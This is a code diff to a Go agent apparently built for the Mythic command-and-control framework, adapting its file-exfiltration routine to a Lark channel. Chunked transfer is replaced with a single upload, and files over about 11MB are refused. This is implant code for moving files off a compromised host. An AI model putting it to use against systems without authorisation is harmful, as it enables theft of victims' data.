@@ -232,7 +232,7 @@ func printInternalTCPConnectionMap() {
 	fmt.Printf("---- done -----\n")
 }
 
-// SendFileChunks - Helper function to deal with sending files from agent to Mythic
+// Lark currently does not support chunking - download as 1 file
 func SendFile(sendFileToMythic structs.SendFileToMythicStruct) {
 	var size int64
 	if sendFileToMythic.Data == nil {
@@ -261,8 +261,19 @@ func SendFile(sendFileToMythic structs.SendFileToMythicStruct) {
 		size = int64(len(*sendFileToMythic.Data))
 	}
 
-	const FILE_CHUNK_SIZE = 512000 //Normal mythic chunk size
-	chunks := uint64(math.Ceil(float64(size) / FILE_CHUNK_SIZE))
+	// Lark supports a max size of ~20MB (20,971,520), if size > ~11MB before b64 encoding + encrypyting -> cancel the download
+	if size > 11000000 {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = sendFileToMythic.Task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("This file exceeds ~11MB before b64 encoding and encrypting, canceling download to prevent API failures\n")
+		sendFileToMythic.Task.Job.SendResponses <- errResponse
+		sendFileToMythic.FinishedTransfer <- 1
+		return
+	}
+
+	FILE_CHUNK_SIZE := size
+	chunks := uint64(math.Ceil(float64(size) / float64(FILE_CHUNK_SIZE)))
 	fileDownloadData := structs.FileDownloadMessage{}
 	fileDownloadData.TotalChunks = int(chunks)
 	abspath, err := filepath.Abs(sendFileToMythic.FullPath)
@@ -330,7 +341,7 @@ func SendFile(sendFileToMythic structs.SendFileToMythicStruct) {
 			return
 		}
 		time.Sleep(time.Duration(sendFileToMythic.Task.Job.C2.GetSleepTime()) * time.Second)
-		partSize := int(math.Min(FILE_CHUNK_SIZE, float64(int64(size)-int64(i*FILE_CHUNK_SIZE))))
+		partSize := int(math.Min(float64(FILE_CHUNK_SIZE), float64(int64(size)-int64(i*uint64(FILE_CHUNK_SIZE)))))
 		partBuffer := make([]byte, partSize)
 		// Create a temporary buffer and read a chunk into that buffer from the file
 		if sendFileToMythic.Data != nil {
@@ -345,7 +356,7 @@ func SendFile(sendFileToMythic structs.SendFileToMythicStruct) {
 				return
 			}
 		} else {
-			sendFileToMythic.File.Seek(int64(i*FILE_CHUNK_SIZE), 1)
+			sendFileToMythic.File.Seek(int64(i*uint64(FILE_CHUNK_SIZE)), 1)
 			_, err = sendFileToMythic.File.Read(partBuffer)
 			if err != io.EOF && err != nil {
 				errResponse := structs.Response{}
